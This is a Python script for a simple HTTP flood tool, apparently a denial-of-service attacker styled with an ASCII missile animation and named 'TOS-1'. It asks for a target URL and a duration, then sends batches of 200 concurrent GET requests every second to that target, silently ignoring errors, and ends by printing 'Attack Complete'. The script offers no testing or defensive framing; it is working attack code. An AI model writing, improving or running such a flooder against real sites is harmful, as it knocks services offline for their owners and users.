import asyncio
import aiohttp
import random
import time
import os

# Terminal clear
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Countdown loader
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        await asyncio.sleep(1)

# Perfect missile body (multi-line)
MISSILE_BODY = [
"          /  \\",
"         |    |",
"         |    |",
"         |    |",
"         |    |",
"         |    |",
"         |    |",
"        /      \\",
"       |        |",
"       |        |",
"       |        |",
"       |        |",
"       |        |",
"       |        |",
"       |        |",
"      /|        |\\",
"     /_|________|_\\",
"        |      |",
"        |      |",
"        |      |",
"        '------'"
]

# Exhaust options
EXHAUST_FRAMES = ["   ^^   ", "   vv   ", "   **   ", "   ##   ", "   oo   "]

# Missile class
class Missile:
    def __init__(self, max_y, max_x):
        self.max_y = max_y
        self.max_x = max_x
        self.reset()

    def reset(self):
        self.x = random.randint(5, self.max_x - 30)
        self.y = self.max_y
        self.exhaust = random.choice(EXHAUST_FRAMES)
        self.active = False  # starts inactive
        self.launch_delay = random.uniform(1, 2)  # 1-2s delay

    def move(self):
        if self.active:
            self.y -= 1
            if self.y < -len(MISSILE_BODY):
                self.reset()

# Draw missile
def draw_missile(missile, height):
    buffer = [""] * height
    if missile.active:
        for i, line in enumerate(MISSILE_BODY):
            pos = missile.y - len(MISSILE_BODY) + i
            if 0 <= pos < height:
                buffer[pos] += " " * missile.x + line
        # Draw exhaust at bottom
        exhaust_pos = missile.y
        if 0 <= exhaust_pos < height:
            buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
    clear()
    print("\n".join(buffer))

# HTTP request sender
async def send_requests(target, duration):
    semaphore = asyncio.Semaphore(200)
    end_time = time.time() + duration

    async def fetch(session):
        async with semaphore:
            try:
                async with session.get(target) as response:
                    await response.text()
            except:
                pass

    async with aiohttp.ClientSession() as session:
        while time.time() < end_time:
            tasks = [fetch(session) for _ in range(200)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)

# Main function
async def main():
    TERMINAL_HEIGHT = 40
    TERMINAL_WIDTH = 80

    target = input("¿TARGZ > ")
    duration = int(input("¿DU > "))

    await countdown_loader(30)

    missile = Missile(TERMINAL_HEIGHT, TERMINAL_WIDTH)

    # Start HTTP requests
    request_task = asyncio.create_task(send_requests(target, duration))

    start_time = time.time()
    last_launch = time.time()

    while time.time() - start_time < duration:
        now = time.time()
        # Activate missile based on launch delay
        if not missile.active and now - last_launch >= missile.launch_delay:
            missile.active = True
            last_launch = now
        # Move missile if active
        missile.move()
        draw_missile(missile, TERMINAL_HEIGHT)
        await asyncio.sleep(0.1)

    await request_task
    print("=== TOS-1: Attack Complete ===")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
        print("TOS-1 terminated by user.")
